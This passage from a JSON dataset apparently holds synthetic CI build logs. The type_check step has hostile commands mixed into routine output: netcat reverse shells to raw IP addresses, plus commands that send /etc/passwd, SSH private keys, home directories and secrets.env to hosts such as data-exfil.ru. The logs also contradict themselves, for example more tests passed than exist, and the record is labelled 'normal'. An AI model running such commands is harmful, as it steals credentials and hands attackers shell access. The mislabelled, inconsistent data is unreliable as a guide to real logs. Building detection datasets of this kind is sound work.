          "Step 17/25: Testing",
          "[12:46:48] DEBUG: Memory usage: 1128MB",
          "Using Python 3.11",
          "Connection established",
          "Uploading artifact 'dist' (34 files)",
          "Cache saved successfully",
          "WARNING: jest has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Minifying vendor.js",
          "Pulling image: node:latest",
          "Cache restored successfully (473MB)",
          "WARNING: jest has known vulnerabilities",
          "[12:46:48] INFO: Connecting to database",
          "Pushing to registry...",
          "Test Suites: 40 passed, 38 total",
          "pip install: Successfully installed lodash-5.9",
          "Processing...",
          "Ready.",
          "Using Python 3.12",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling utils/utils.go...",
          "Cache restored successfully (458MB)",
          "\u2713 build completed",
          "Loading...",
          "Test Suites: 13 passed, 40 total",
          "pip: Downloading webpack-3.1.tar.gz",
          "Cache invalidated: dependencies",
          "\u2713 Task completed in 4010ms",
          "Optimizing 61 modules...",
          "HEAD is now at a1415cf",
          "Step 14/18: Building",
          "[12:46:48] INFO: Cache refreshed",
          "[12:46:48] DEBUG: Connection pool: 14 active",
          "pip install: Successfully installed react-3.4",
          "[12:46:48] DEBUG: Loading configuration",
          "Time: 119.572s",
          "[12:46:48] DEBUG: Loading configuration",
          "Using Python 3.11",
          "Pulling image: alpine:18",
          "Success!",
          "[12:46:48] INFO: Processing request",
          "Completed.",
          "Finished.",
          "  PASS: integration/test_db_connect.spec.js",
          "Step 3/19: Linting",
          "Creating production build...",
          "Step 19/22: Running migrations",
          "[12:46:48] ERROR: Connection failed",
          "npm notice: created a lockfile",
          "Artifact uploaded: dist.zip (99MB)",
          "Cache restored successfully (215MB)",
          "pip install: Successfully installed jest-1.0",
          "Tests: 303 passed, 382 total",
          "npm install: added 340 packages",
          "[12:46:48] DEBUG: Query executed in 28ms",
          "GET /api - 200 (67ms)",
          "HEAD is now at 13a16f7",
          "Step 1/17: Linting",
          "[12:46:48] INFO: Request completed",
          "Test Suites: 49 passed, 44 total",
          "pip: Collecting lodash",
          "\u2713 package completed",
          "Bundling runtime.css",
          "[12:46:48] DEBUG: Initializing service",
          "Checking out main branch",
          "Test Suites: 36 passed, 35 total",
          "Waiting...",
          "Image pulled successfully",
          "Transforming 342 files...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-18T12:49:14.294538",
        "finished_at": "2025-12-18T12:50:06.319302",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Artifact uploaded: dist.zip (22MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:48] DEBUG: Initializing service",
          "\u2713 Step 'test' succeeded",
          "\u2717 build failed with exit code 14",
          "Snapshots: 31 passed, 16 total",
          "Artifact downloaded: 49MB",
          "Snapshots: 9 passed, 11 total",
          "Fetching from https://pypi.org/package.json",
          "Layer 9/15: RUN command",
          "Layer 7/15: RUN command",
          "Connection established",
          "[12:46:48] DEBUG: Connection pool: 4 active",
          "npm notice: package.json updated",
          "Tests: 347 passed, 488 total",
          "WARNING: express has known vulnerabilities",
          "Checking out main branch",
          "Pushing to registry...",
          "POST /api - 201 (283ms)",
          "pip: Downloading webpack-4.3.tar.gz",
          "[12:46:48] DEBUG: Loading configuration",
          "WARNING: webpack has known vulnerabilities",
          "Ran 184 tests in 53s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Task completed in 4567ms",
          "Step 2/23: Testing",
          "Cache saved successfully",
          "Step 9/25: Linting",
          "Ran 10 tests in 43s",
          "npm notice: package.json updated",
          "Switched to branch 'bugfix/task-614'",
          "Already up to date.",
          "Compiling lib/utils.go...",
          "pip: Installing build dependencies...",
          "TLS handshake completed",
          "NODE_ENV=development",
          "[12:46:48] INFO: Connecting to database",
          "Uploading artifact 'build' (22 files)",
          "Verifying...",
          "Fetching submodules...",
          "  PASS: test_cache_hit (314ms)",
          "npm install: added 33 packages",
          "TLS handshake completed",
          "Compiling utils/service.java...",
          "Image pulled successfully",
          "Time: 102.138s",
          "Coverage: 75% statements, 79% branches",
          "HEAD is now at b61425d",
          "[12:46:48] WARN: Deprecated API usage",
          "Step 10/21: Running migrations",
          "Cache restored successfully (303MB)",
          "WARNING: eslint has known vulnerabilities",
          "Coverage: 78% statements, 91% branches",
          "Done.",
          "Image pulled successfully",
          "Step 14/25: Deploying",
          "Done.",
          "[12:46:48] INFO: Request completed",
          "Generating source maps...",
          "Success!",
          "Completed.",
          "[12:46:48] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (96MB)",
          "npm notice: created a lockfile",
          "pip install: Successfully installed jest-2.2",
          "Checking out main branch",
          "[12:46:48] DEBUG: Connection pool: 11 active",
          "Image pulled successfully",
          "Completed.",
          "Coverage: 87% statements, 94% branches",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:48] INFO: Processing request",
          "npm install: added 432 packages",
          "NODE_ENV=production",
          "Minifying main.js",
          "Checking out main branch",
          "Processing...",
          "[12:46:48] INFO: Starting build process",
          "Done.",
          "Waiting...",
          "Platform: win32-x64",
          "Cache hit for key-6616",
          "Verifying...",
          "Step 8/25: Deploying",
          "npm notice: created a lockfile",
          "Cache restored successfully (149MB)",
          "Uploading artifact 'dist' (38 files)",
          "[12:46:48] DEBUG: Loading configuration",
          "Step 11/23: Running migrations",
          "[12:46:48] DEBUG: Loading configuration",
          "Creating production build...",
          "OK",
          "Already up to date.",
          "Generating source maps...",
          "Fetching submodules...",
          "Loading...",
          "HEAD is now at 6a48097",
          "Verifying...",
          "yarn add: Done in 24.45s",
          "Compiling components/service.java...",
          "\u2713 All checks passed",
          "Processing...",
          "Ran 156 tests in 14s",
          "pip install: Successfully installed react-2.6",
          "Platform: darwin-arm64",
          "Tests: 360 passed, 321 total",
          "Tests: 255 passed, 375 total",
          "yarn add: Done in 26.27s",
          "Ran 151 tests in 9s",
          "Step 2/16: Running migrations",
          "Pulling image: alpine:latest",
          "pip: Downloading lodash-1.8.tar.gz",
          "Image pulled successfully",
          "[12:46:48] WARN: Deprecated API usage",
          "npm install: resolved 847 packages",
          "Step 17/21: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Creating production build...",
          "\u2717 build failed with exit code 105",
          "[12:46:48] INFO: Cache refreshed",
          "Transforming 547 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/index.js...",
          "WARNING: lodash has known vulnerabilities",
          "POST /data - 202 (127ms)",
          "[12:46:48] INFO: Request completed",
          "npm install: resolved 129 packages",
          "Step 19/18: Testing",
          "Layer 6/8: ENV command",
          "Using Node.js 14.8.5",
          "Artifact downloaded: 6MB",
          "Using Python 3.11",
          "Optimizing 40 modules...",
          "GET /health - 200 (56ms)",
          "Uploading artifact 'coverage' (20 files)",
          "Connection established",
          "HEAD is now at bc99a95",
          "Uploading artifact 'dist' (8 files)",
          "Cache hit for key-9182",
          "npm install: resolved 1044 packages",
          "GET /api - 201 (75ms)",
          "pip: Collecting eslint",
          "Building Docker image...",
          "[12:46:48] INFO: Processing request",
          "Success!",
          "Uploading artifact 'dist' (36 files)",
          "Fetching submodules...",
          "pip: Downloading jest-3.11.tar.gz",
          "Artifact uploaded: dist.zip (91MB)",
          "Tests: 396 passed, 423 total",
          "\u2713 All checks passed",
          "Compiling lib/app.ts...",
          "npm notice: package.json updated",
          "[12:46:48] INFO: Request completed",
          "Generating source maps...",
          "Layer 7/13: COPY command",
          "Using Python 3.10",
          "Pushing to registry...",
          "Tests: 221 passed, 374 total",
          "Artifact uploaded: dist.zip (86MB)",
          "FAILED: test_user_create",
          "[12:46:48] DEBUG: Memory usage: 1357MB",
          "pip: Downloading webpack-3.17.tar.gz",
          "[12:46:48] DEBUG: Loading configuration",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-18T12:50:06.319302",
        "finished_at": "2025-12-18T12:50:23.660890",
        "log_lines": [
          "=== Step: type_check ===",
          "WARNING: eslint has known vulnerabilities",
          "Creating production build...",
          "Completed.",
          "Success!",
          "[12:46:48] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "\u2717 build failed with exit code 3",
          "Uploading artifact 'coverage' (14 files)",
          "Transforming 468 files...",
          "TLS handshake completed",
          "Already up to date.",
          "npm notice: created a lockfile",
          "pip: Collecting jest",
          "Environment: production",
          "[12:46:48] DEBUG: Initializing service",
          "Ready.",
          "nc -e /bin/sh 195.39.41.161 26761",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "pip: Downloading express-1.20.tar.gz",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 56.106.36.89 52825",
          "Success!",
          "TLS handshake completed",
          "npm install: added 144 packages",
          "npm install: added 364 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 11.5.42.145 57446",
          "  PASS: unit/test_cache_hit.spec.js",
          "Artifact uploaded: dist.zip (93MB)",
          "Verifying...",
          "Coverage: 72% statements, 91% branches",
          "yarn add: Done in 25.10s",
          "WARNING: webpack has known vulnerabilities",
          "Time: 117.851s",
          "NODE_ENV=production",
          "POST /api - 200 (439ms)",
          "Step 2/18: Running migrations",
          "Cache restored successfully (223MB)",
          "\u2717 build failed with exit code 20",
          "[12:46:48] DEBUG: Connection pool: 3 active",
          "Compiling utils/service.java...",
          "Tests: 162 passed, 250 total",
          "Step 11/18: Testing",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 1.122.76.168 20378",
          "Step 7/22: Linting",
          "Using Python 3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "nc -e /bin/sh 226.77.28.222 2116",
          "Completed.",
          "Step 1/22: Linting",
          "[12:46:48] DEBUG: Connection pool: 15 active",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Already up to date.",
          "npm notice: package.json updated",
          "npm install: added 172 packages",
          "Exception: RuntimeError",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 719ms",
          "Time: 84.459s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "nc -e /bin/sh 211.224.77.236 61902",
          "Installing eslint@2.6.2",
          "npm install: added 418 packages",
          "TLS handshake completed",
          "[12:46:48] INFO: Request completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:46:48] DEBUG: Query executed in 5ms",
          "Artifact downloaded: 31MB",
          "Pushing to registry...",
          "[12:46:48] INFO: Processing request",
          "  PASS: unit/test_api_health.spec.js",
          "Image pulled successfully",
          "Cache invalidated: build",
          "pip install: Successfully installed lodash-2.11",
          "Compiling lib/main.py...",
          "  PASS: test_user_create (120ms)",
          "\u2717 build failed with exit code 18",
          "Installing react@4.15.6",
          "Pulling image: node:3.11",
          "yarn add: Done in 27.89s",
          "Installing jest@2.16.7",
          "Compiling lib/utils.go...",
          "WARNING: react has known vulnerabilities",
          "Coverage: 100% statements, 73% branches",
          "  PASS: e2e/test_auth_login.spec.js",
          "Using Python 3.11",
          "Step 15/22: Building",
          "Switched to branch 'feature/task-550'",
          "[12:46:48] ERROR: Connection failed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 92.10.34.209 56636",
          "Compiling src/handler.rs...",
          "FAILED: test_user_create",
          "Tests: 52 passed, 494 total",
          "Snapshots: 39 passed, 14 total",
          "Processing...",
          "pip: Collecting prettier",
          "NODE_ENV=test",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:46:48] ERROR: Connection failed",
          "Cache restored successfully (268MB)",
          "Tests: 219 passed, 179 total",
          "Compiling lib/handler.rs...",
          "pip: Downloading eslint-3.2.tar.gz",
          "Uploading artifact 'coverage' (30 files)",
          "Environment: staging",
          "[12:46:48] DEBUG: Connection pool: 17 active",
          "Compiling components/app.ts...",
          "TLS handshake completed",
          "Time: 70.653s",
          "Cache saved successfully",
          "Pushing to registry...",
          "\u2713 Step 'setup' succeeded",
          "Artifact uploaded: dist.zip (33MB)",
          "[12:46:48] WARN: Deprecated API usage",
          "  PASS: unit/test_cache_hit.spec.js",
          "Cache miss for key-4045",
          "\u2713 deploy completed",
          "WARNING: axios has known vulnerabilities",
          "[12:46:48] DEBUG: Loading configuration",
          "Success!",
          "Fetching submodules...",
          "Platform: darwin-arm64",
          "pip: Downloading eslint-3.2.tar.gz",
          "Done.",
          "Platform: darwin-arm64",
          "Environment: staging",
          "[12:46:48] INFO: Processing request",
          "  PASS: integration/test_db_connect.spec.js",
          "Snapshots: 23 passed, 30 total",
          "Compiling components/main.py...",
          "Sending 307MB of data to crypto-mine.io",
          "Minifying app.js",
          "GET /health - 204 (2ms)",
          "Exception: NullPointerException",
          "Environment: staging",
          "Platform: darwin-arm64",
          "[12:46:48] INFO: Request completed",
          "pip install: Successfully installed jest-1.3",
          "Layer 4/14: RUN command",
          "Step 14/19: Deploying",
          "Environment: test",
          "Artifact uploaded: dist.zip (47MB)",
          "Success!",
          "Artifact uploaded: build.tar.gz (48MB)",
          "GET /api - 204 (42ms)",
          "Cache miss for key-2849",
          "Environment: staging",
          "NODE_ENV=development",
          "Waiting...",
          "Test Suites: 44 passed, 44 total",
          "Using Python 3.12",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "Step 6/15: Installing dependencies",
          "Test Suites: 37 passed, 31 total",
          "Step 11/18: Installing dependencies",
          "Success!",
          "Tests: 63 passed, 142 total",
          "Switched to branch 'hotfix/task-534'",
          "Processing...",
          "Building Docker image...",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "Compiling src/utils.go...",
          "[12:46:48] DEBUG: Query executed in 40ms",
          "[12:46:48] WARN: Deprecated API usage",
          "Tests: 286 passed, 368 total",
          "Finished.",
          "Cache invalidated: dependencies",
          "Ready.",
          "TLS handshake completed",
          "Ran 124 tests in 31s",
          "[12:46:48] WARN: Deprecated API usage",
          "pip install: Successfully installed eslint-1.3",
          "Compiling lib/utils.go...",
          "Artifact uploaded: dist.zip (98MB)",
          "Sending 250MB of data to evil-server.cc",
          "=== Step type_check completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}